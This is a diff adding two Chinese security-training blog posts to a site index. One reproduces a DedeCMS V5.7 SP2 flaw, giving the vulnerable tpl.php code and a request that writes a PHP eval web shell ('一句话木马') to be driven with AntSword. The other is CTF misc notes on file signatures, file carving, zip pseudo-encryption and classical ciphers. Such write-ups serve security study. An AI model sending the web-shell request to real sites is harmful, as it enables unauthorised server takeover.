@@ -156,6 +156,164 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-drops夏令营15" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营15/">漏洞复现</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/20/drops夏令营15/" class="archive-article-date">
+  	<time datetime="2019-07-20T06:25:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一、    dedeCMS<br>漏洞的文件路径    DedeCMS-V5.7-UTF8-SP2\uploads\dede\tpl.php<br>漏洞的代码如下：</p>
+<p>else if($action==’savetagfile’)<br>{<br>    csrf_check();<br>    if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))<br>    {<br>        ShowMsg(‘文件名不合法，不允许进行操作！’, ‘-1’);<br>        exit();<br>    }<br>    require_once(DEDEINC.’/oxwindow.class.php’);<br>    $tagname = preg_replace(“#.lib.php$#i”, “”, $filename);<br>    $content = stripslashes($content);<br>    $truefile = DEDEINC.’/taglib/‘.$filename;<br>    $fp = fopen($truefile, ‘w’);<br>    fwrite($fp, $content);<br>fclose($fp);</p>
+<p>通过分析发现，因为没有对写入的内容做过滤，我们可以写一句话木马上传了</p>
+<p>if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))<br>Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的.意思是匹配小数点，i表示大小写不敏感<br>Preg_replace<br>Stripslashes()该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
+<p>UR输入 域名+/ DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload<br>获取 token<br>然后输入action=savetagfile&amp;token=b87a7b8629b120fb009c8992cce7c68f&amp;filename=123.lib.php&amp;content=<?php%20@eval($_POST["hello"]);?></p>
+<p>上传一个123.lib.php文件，里边写着一句话木马</p>
+<p>然后用蚁剑连上；</p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/20/drops夏令营15/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-drops夏令营13" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/19/drops夏令营13/">ctf之MISC</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/19/drops夏令营13/" class="archive-article-date">
+  	<time datetime="2019-07-19T07:31:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>流量分析<br>文件格式分析<br>隐写 图片 音频<br>压缩包分析<br>古典密码</p>
+<hr>
+<p>流量分析（wireshark使用）<br>……<br>……</p>
+<h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><p>常见文件头和文件尾的16进制编码：<br>JPEG (jpg)                 文件头：FFD8FF　              文件尾：FF D9　　　　　PNG (png)                文件头：89504E47              文件尾：AE 42 60 82　　　GIF (gif)                    文件头：47494638　          文件尾：00 3B 　　　　<br>ZIP Archive (zip)     文件头：504B0304　　       文件尾：50 4B　　　　　　　　　TIFF (tif)，               文件头：49492A00　<br>RAR Archive (rar)，                    文件头：52617221　<br>Windows Bitmap (bmp)，      　  文件头：424D<br>Adobe Photoshop (psd)，          文件头：38425053<br>Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　<br>XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　HTML (html)，                           文件头：68746D6C3E<br>Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                    文件头：5374616E64617264204A<br>WordPerfect (wpd)，                  文件头：FF575043<br>Adobe Acrobat (pdf)，               文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>……</p>
+<hr>
+<p>文件分离的方法</p>
+<p>  除了用foremost外，还有binwalk、dd命令<br>binwalk -e 文件名<br>dd<br>前面介绍的是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。<br>使用dd命令分离文件格式如下：<br>dd if=源文件名 of=输出文件名 skip=开始分离的字节数 bs=1；<br>参数说明：<br>if=file #输入文件名，缺省为标准输入。<br>of=file #输出文件名，缺省为标准输出。<br>bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。<br>skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。</p>
+<hr>
+<p>Lsb隐写 和音频隐写（Audacity、MP3stego 使用）<br>……<br>。。。。。。</p>
+<hr>
+<p>Zip伪加密问题</p>
+<img src="/2019/07/19/drops夏令营13/zip伪加密.jpg" title="zip伪加密">
+
+<p>识别真假加密<br>无加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00<br>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
+<p>对于伪加密有以下几种方法：</p>
+<ol>
+<li>在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包</li>
+<li>使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误。<br>使用ZipCenOp.jar(需要java环境)，在cmd中使用<br>java -jar ZipCenOp.jar -r xxx.zip</li>
+</ol>
+<hr>
+<p>压缩包明文攻击<br>  明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</p>
+<p>……<br>。。。。。。</p>
+<hr>
+<p>古典密码</p>
+<p>凯撒密码<br>栅栏密码<br>棋盘密码<br>希尔密码<br>摩斯电码<br>猪圈密码<br>键盘密码<br>当铺密码（<a href="http://www.zjslove.com/3.decode/dangpu/index.html）" target="_blank" rel="noopener">http://www.zjslove.com/3.decode/dangpu/index.html）</a></p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/19/drops夏令营13/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-drops夏令营12" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
